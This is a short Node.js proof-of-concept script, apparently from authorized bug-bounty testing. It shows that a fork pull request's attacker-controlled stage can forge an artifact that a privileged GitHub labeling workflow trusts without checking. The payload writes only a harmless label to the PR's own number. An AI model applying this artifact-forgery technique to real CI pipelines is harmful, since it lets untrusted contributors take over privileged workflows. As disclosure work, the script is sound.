const fs = require('fs');

// SECURITY RESEARCH POC (authorized Bugcrowd testing, JustEatTakeaway program).
// Proves the "Get" stage script (fully attacker-controlled on a fork PR) can
// forge arbitrary artifact content that the privileged "Set" workflow
// (labeler-set-labels.yml, running with a GitHub App token) trusts without
// validation. prNumber is deliberately passed through unchanged (self-targeting
// only - this PoC never references any other PR or issue).
module.exports = async ({ prNumber, artifactFilePath }) => {
        const newLabels = ['pie-confused-deputy-poc'];
        const artifactStr = JSON.stringify({ prNumber, newLabels }, null, 2);
        fs.writeFileSync(artifactFilePath, artifactStr, { encoding: 'utf8' });
};
